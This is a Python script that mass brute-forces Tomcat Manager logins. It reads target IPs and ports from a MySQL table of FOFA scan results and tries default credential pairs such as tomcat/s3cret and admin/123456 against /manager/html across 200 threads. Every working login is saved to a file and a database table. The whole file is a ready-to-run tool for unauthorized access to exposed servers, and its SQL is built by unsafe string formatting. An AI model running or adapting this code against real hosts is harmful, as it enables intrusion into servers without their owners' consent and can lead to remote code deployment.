import base64
import http
import logging
import os
from queue import Queue
from threading import Thread

import pymysql
import requests

logging.captureWarnings(True)

http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'

TABLENAME = "tomresu"  # 存储扫描结果的表
DATATABLENAME = "fofadata"  # 存储数据来源的表
HOST = "127.0.0.1"
PORT = 3306
USER = "root"
PASSWORD = "root"
DATABASE = "fofa"  # 数据库
USERS = ['tomcat', 'admin', 'manager']  # 用户名字典
PASSWORDS = ['tomcat', 'admin', '123456', '12345678', 's3cret', 'admin123']  # 密码字典


def conn(ip, port, user, pwd, db):
    try:
        db = pymysql.connect(host=ip, port=port, user=user, password=pwd, database=db, connect_timeout=3)
        return [True, db]
    except Exception as e:
        return [False]


def getTarGet():
    global HOST, PORT, USER, PASSWORD, DATABASE, DATATABLENAME
    db = conn(HOST, PORT, USER, PASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select * from {};".format(DATATABLENAME))
        res = cursor.fetchall()
        cursor.close()
        database.close()
        return res


def init(tablename):
    global HOST, PORT, USER, PASSWORD, DATABASE
    db = conn(HOST, PORT, USER, PASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute(
            "create table if not exists " + tablename + "(id int auto_increment,ip varchar(100),port varchar(100),url varchar(100),uname varchar(100),pwd varchar(100),primary key(id))charset=utf8;")
        database.commit()
        cursor.close()
        database.close()


def insert(tablename, url, user, pwd, ip, port):
    global HOST, PORT, USER, PASSWORD, DATABASE
    db = conn(HOST, PORT, USER, PASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select ip,port from {};".format(tablename))
        res = cursor.fetchall()
        b = True
        for i in res:
            if i['ip'] == ip and i['port'] == port:
                b = False
                break
        if b:
            cursor.execute(
                "insert into " + tablename + " (url,uname,pwd,ip,port) VALUES ('{}','{}','{}','{}',{})".format(url,
                                                                                                               user,
                                                                                                               pwd, ip,
                                                                                                               port))
            database.commit()
        cursor.close()
        database.close()


def attack(ip, port, data):
    target = 'http://' + ip + ":" + str(port) + '/manager/html'
    a = data.split(",")[0] + ":" + data.split(",")[1]
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Referer": 'http://' + ip + ":" + str(port) + "/",
        "Authorization": "Basic " + base64.b64encode(a.encode('utf-8')).decode(),
        "Host": ip + ":" + str(port),
        "Cache-Control": "max-age=0",
        "Connection": "close",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
    }
    try:
        r = requests.get(target, headers=headers, verify=False, timeout=5)
        if r.status_code == 200 and "JVM" in r.text:
            with open("success.txt", 'a+', encoding='utf-8') as f1:
                f1.write("%s\t%s\n" % (target, a))
                insert(TABLENAME, target, data.split(",")[0], data.split(",")[1], ip, port)
            print("%s\t%s" % (target, a))
            return True
    except Exception as e:
        pass


class Burper(Thread):
    def __init__(self, q):
        super().__init__()
        self.q = q

    def run(self):
        while not self.q.empty():
            try:
                t = self.q.get()
                ip = t.split(";;")[0]
                port = int(t.split(";;")[1])
                data = t.split(";;")[2]
                attack(ip, port, data)
            except Exception as e:
                pass


if __name__ == '__main__':
    if os.path.exists("success.txt"):
        os.remove('success.txt')
    ts = getTarGet()
    init(TABLENAME)
    q = Queue()
    for t in ts:
        ip = t['ip']
        port = t['port']
        for USER in USERS:
            for PASSWORD in PASSWORDS:
                q.put("%s;;%s;;%s,%s" % (ip, port, USER, PASSWORD))
    threads = []
    for i in range(200):
        threads.append(Burper(q))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    # print(attack('127.0.0.1',8080,'tomcat,tomcat'))
